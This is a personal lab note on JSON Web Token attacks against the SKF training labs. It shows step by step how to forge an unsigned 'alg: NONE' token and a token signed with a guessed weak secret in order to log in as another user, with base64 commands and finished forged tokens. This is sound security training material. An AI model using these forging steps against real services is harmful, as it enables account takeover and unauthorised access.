---
tags:
  - vulnerabilty
  - "#jsonwebtoken"
---
# What is a JSON Web Token

Is a open standard that allow the creations of tokens of access that allow to give identity, privilege to a user

![](../../Images/jwt_ng1_en.png)

JSON Web Token are divided in three parts, the separator is a point ( . ):

1. Header. 
2. Payload. Contain the main information
3. Signature. Verify the integrity of the token to avoid possible manipulation

In the signature you have a **secret**, that is a hard-coded key that only can find in a internal config file 

If you have the secret (because you obtain with some local file inclusion or something like that) you can generate a new JSON Web Token and no matter what you put in the payload

---

# Exploiting JWT NULL cipher

![](../../Images/Pasted%20image%2020230906133710.png)

Sometimes some JWT accept none like **alg** (algorithm, this is in header), if they allow to put this, the signature part is not necessary and can be omitted.

In this case we are going to try to login like user2, but we are user

Open the developer tools of the browser and take the JWT of user

For do this you have to Authenticate that give you the JWT and then click in Admin button, now if you go **local storage** you can see the **access_token**

Go to [jwt.io](https://jwt.io) and put the token

![](../../Images/Pasted%20image%2020230906135205.png)

Now we can image that the next user is **id: 2**

The header and payload of the JWT is in base64, we can create our JWT

This is the header:

```bash
echo -n '{"alg":"NONE","typ":"JWT"}' | base64
```

````bash
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=
````

Now we are going to do the payload:

Look that we are changing the id, we imagine that the user2 have the id:2

````bash
echo -n '{"id":2,"iat":1694001032,"exp":1694004632}' | base64
````

````bash
eyJpZCI6MiwiaWF0IjoxNjk0MDAxMDMyLCJleHAiOjE2OTQwMDQ2MzJ9
````

Now, how it is not necessary to put a cipher we don't have to put **signature** (this would be the problem because we don't have the secret)

Remove the **equal or spaces** if not you can't login as user2

````bash
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNjk0MDAxMDMyLCJleHAiOjE2OTQwMDQ2MzJ9.
````

Now Authenticate like user and click in admin button and change the JWT by the new that we generate

![](../../Images/Pasted%20image%2020230906140441.png)
Nice!!, we authenticate like user2

![](../../Images/Pasted%20image%2020230906140456.png)

---

# JWT secret

![](../../Images/Pasted%20image%2020230906140845.png)

For first, we have to try, we can try if the cipher admit NULL that is not the case

The JWT that we obtain is the same more less, some data change (iat and exp) from payload

![](../../Images/Pasted%20image%2020230906140934.png)

If you repeat the process you are going to see that the **signature is obligatory**, to do a well secret you have to do a strong password (long, multiple characters, numbers...)

But sometimes util words key (bad practice) like secret or password123...

In the [jwt.io](https://jwt.io) you can put the secret and the website build them, in this case we are image that the secret is the word **secret**, you can brute force this or imagine the key word

You have to put this in secret field and change the id to 2, because we imagine that the second user have id 2

![](../../Images/Pasted%20image%2020230906141615.png)

And you have the JWT build

````bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjk0MDAyMTM5LCJleHAiOjE2OTQwMDU3Mzl9.q3QxzwWXC6LMK9fF5mbrarbNMKrqFnvq0cILXG5cGc8
````

We can try to put this JWT in the access_token in local storage:

![](../../Images/Pasted%20image%2020230906141752.png)

And this work!!

---

# Labs

- [https://github.com/blabla1337/skf-labs](https://github.com/blabla1337/skf-labs)

We are going to start with **skf-labs/nodeJs/JWT-null/**

> sudo npm install

> sudo npm start

After we are going to use **skf-labs/nodeJs/JWT-secret/**

